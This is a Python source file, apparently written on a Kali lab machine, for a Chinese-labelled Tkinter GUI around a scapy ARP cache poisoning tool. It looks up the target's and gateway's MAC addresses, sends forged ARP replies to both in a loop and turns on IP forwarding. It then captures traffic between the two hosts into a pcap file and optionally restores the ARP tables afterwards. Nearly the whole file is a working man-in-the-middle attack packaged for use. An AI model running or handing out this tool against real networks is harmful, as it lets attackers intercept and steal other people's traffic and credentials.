#!/home/kali/cyber-attack-test/env/bin/python
from multiprocessing import Process, Event
from ipaddress import ip_address
from scapy.all import ARP, Ether, conf, sendp, sniff, srp, wrpcap # type: ignore
from datetime import datetime
from time import sleep
import argparse
import atexit
import sys
import os
import tkinter as tk
from tkinter import ttk, scrolledtext
from threading import Thread

class ArperGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ARP Spoofer GUI")
        self.arper = None
        self.running = False
        self.create_widgets()
        self.setup_layout()
        
    def create_widgets(self):
        # 输入字段
        self.frame_input = ttk.LabelFrame(self.root, text="攻击参数")
        self.target_ip = tk.StringVar()
        self.gateway_ip = tk.StringVar()
        self.interface = tk.StringVar(value="wlan0")
        self.packet_count = tk.IntVar(value=200)
        self.autorestore = tk.BooleanVar(value=True)
        self.delay = tk.DoubleVar(value=2)

        ttk.Label(self.frame_input, text="目标IP:").grid(row=0, column=0, sticky=tk.W)
        ttk.Entry(self.frame_input, textvariable=self.target_ip).grid(row=0, column=1)

        ttk.Label(self.frame_input, text="网关IP:").grid(row=1, column=0, sticky=tk.W)
        ttk.Entry(self.frame_input, textvariable=self.gateway_ip).grid(row=1, column=1)

        ttk.Label(self.frame_input, text="网络接口:").grid(row=2, column=0, sticky=tk.W)
        ttk.Entry(self.frame_input, textvariable=self.interface).grid(row=2, column=1)

        ttk.Label(self.frame_input, text="嗅探包数量:").grid(row=3, column=0, sticky=tk.W)
        ttk.Spinbox(self.frame_input, textvariable=self.packet_count, from_=1, to=1000).grid(row=3, column=1)

        ttk.Checkbutton(self.frame_input, text="自动恢复ARP表", variable=self.autorestore).grid(row=4, columnspan=2)

        ttk.Label(self.frame_input, text="延迟(秒):").grid(row=5, column=0, sticky=tk.W)
        ttk.Spinbox(self.frame_input, textvariable=self.delay, from_=0.5, to=10, increment=0.5).grid(row=5, column=1)

        # 控制按钮
        self.btn_start = ttk.Button(self.frame_input, text="启动攻击", command=self.start_attack)
        self.btn_stop = ttk.Button(self.frame_input, text="停止", command=self.stop_attack, state=tk.DISABLED)
        self.btn_start.grid(row=6, column=0, pady=5)
        self.btn_stop.grid(row=6, column=1, pady=5)

        # 日志输出
        self.frame_log = ttk.LabelFrame(self.root, text="日志")
        self.log_area = scrolledtext.ScrolledText(self.frame_log, wrap=tk.WORD, width=60, height=15)
        self.log_area.pack(expand=True, fill=tk.BOTH)

    def setup_layout(self):
        self.frame_input.pack(padx=10, pady=5, fill=tk.X)
        self.frame_log.pack(padx=10, pady=5, expand=True, fill=tk.BOTH)

    def log(self, message):
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)
        self.root.update()

    def start_attack(self):
        if os.getuid() != 0:
            self.log("错误：需要root权限！")
            return
            
        target = self.target_ip.get()
        gateway = self.gateway_ip.get()
        interface = self.interface.get()
        
        try:
            self.arper = Arper(
                target=target,
                gateway=gateway,
                interface=interface,
                count=self.packet_count.get(),
                delay=self.delay.get(),
                autorestore=self.autorestore.get(),
                log_callback=self.log
            )
            self.running = True
            self.btn_start.config(state=tk.DISABLED)
            self.btn_stop.config(state=tk.NORMAL)
            Thread(target=self.run_attack, daemon=True).start()
        except Exception as e:
            self.log(f"启动失败: {str(e)}")

    def stop_attack(self):
        self.running = False
        if self.arper:
            self.arper.stop()
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)

    def run_attack(self):
        try:
            enable_forwarding()
            self.arper.run()
        except Exception as e:
            self.log(f"攻击出错: {str(e)}")
        finally:
            self.stop_attack()

class Arper:
    def __init__(self, target: str, gateway: str, interface:str, 
                 count: int = 200, delay=2, autorestore: bool = True,
                 log_callback=None):
        self.log = log_callback or (lambda x: None)
        try:
            addr1, addr2 = ip_address(target), ip_address(gateway)
            if (addr1.version != 4) or (addr2.version != 4):
                raise ValueError("ARP cache poisoning is ineffective against IPv6")
        except Exception as e:
            raise ValueError(f'Invalid input: {e}')
        
        self.autorestore = autorestore
        self.target = target
        self.target_mac = get_mac(self.target)
        if self.target_mac is None:
            raise ValueError("Target not found")
            
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.count = count
        self.interface = interface
        self.delay = delay
        self.poison_event = Event()
        self.sniff_event = Event()
        self.stop_event = Event()
        conf.iface = interface
        conf.verb = 0

        self.log(f'初始化 {interface}:')
        self.log(f'网关 ({gateway}) MAC: {self.gateway_mac}')
        self.log(f'目标 ({target}) MAC: {self.target_mac}')
        self.log('-' * 30)

    def run(self):
        self.sniff_process = Process(target=self.sniff)
        self.sniff_process.start()
        sleep(1)
        poison_process = Process(target=self.poison)
        poison_process.start()
        self.sniff_process.join()
        poison_process.join()

    def poison(self):
        try:
            # 构造毒化目标的数据包
            ether_target = Ether(dst=self.target_mac)
            arp_target = ARP(
                op=2,  # ARP响应
                psrc=self.gateway,  # 伪装成网关IP
                pdst=self.target,   # 目标IP
                hwdst=self.target_mac  # 目标MAC
            )
            poison_target = ether_target / arp_target

            # 构造毒化网关的数据包
            ether_gateway = Ether(dst=self.gateway_mac)
            arp_gateway = ARP(
                op=2,  # ARP响应
                psrc=self.target,    # 伪装成目标IP
                pdst=self.gateway,   # 网关IP 
                hwdst=self.gateway_mac  # 网关MAC
            )
            poison_gateway = ether_gateway / arp_gateway

            # 显示数据包信息（通过GUI日志回调）
            self.log("[+] 生成的毒化数据包详情：")
            self.log(f"目标毒化包: {poison_target.summary()}")
            self.log(f"网关毒化包: {poison_gateway.summary()}")
            self.log("-" * 40)

            # 发送循环
            self.log("[!] 开始ARP毒化攻击（按停止按钮中断）")
            send_count = 0
            while not self.stop_event.is_set() and not self.poison_event.is_set():
                try:
                    # 发送双向量毒化包
                    sendp(poison_target, verbose=False)
                    sendp(poison_gateway, verbose=False)
                    send_count += 1
                    
                    # 每发送5次更新状态
                    if send_count % 5 == 0:
                        self.log(f"已发送 {send_count*2} 个毒化包", end="\r")
                    
                    # 保持发送间隔
                    sleep(self.delay)
                    
                except Exception as e:
                    self.log(f"发送错误: {str(e)}")
                    break

            # 中断后的处理
            if self.stop_event.is_set():
                self.log("[!] 用户手动停止攻击")
                self.sniff_process.kill()
            else:
                self.log("[!] 嗅探完成，自动停止毒化")

            # 无论是否完成都执行恢复
            self.restore()

        except KeyboardInterrupt:
            self.log("[!] 键盘中断")
            self.stop_event.set()
            self.restore()
        except Exception as e:
            self.log(f"[!] 发生错误: {str(e)}")
        finally:
            self.log("[+] 毒化进程已终止")


    def sniff(self):
        self.log(f'开始捕获{self.count}个数据包...')
        bpf_filter = f'host {self.target} and host {self.gateway} and not arp'
        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
        self.poison_event.set()
        wrpcap(f"arper_{self.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
        print('Got the packets')


    def restore(self):
        if self.autorestore:
            self.log('恢复ARP表中...')
            sendp(
                Ether(src=self.gateway_mac, 
                      dst=self.target_mac) / 
                ARP(
                    op=2, 
                    psrc=self.gateway, 
                    hwsrc=self.gateway_mac, 
                    pdst=self.target, 
                    hwdst=self.target_mac, 
                    ), 
                count=5
                )
            sendp(
                Ether(src=self.target_mac, 
                      dst=self.gateway_mac) / 
                ARP(
                    op=2, 
                    psrc=self.target, 
                    hwsrc=self.target_mac, 
                    pdst=self.gateway, 
                    hwdst=self.gateway_mac
                    ), 
                count=5)

    def stop(self):
        self.stop_event.set()
        if self.sniff_process.is_alive():
            self.sniff_process.terminate()
        self.restore()

def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

def enable_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == 1:
                return
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1\n')
    except Exception as e:
        print(e)
        exit(1)
    def restore():
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
        except Exception as e:
            print(e)
            exit(1)
    atexit.register(restore)

if __name__ == '__main__':
    if os.getuid() != 0:
        print("需要root权限！")
        exit(1)
        
    root = tk.Tk()
    app = ArperGUI(root)
    root.mainloop()
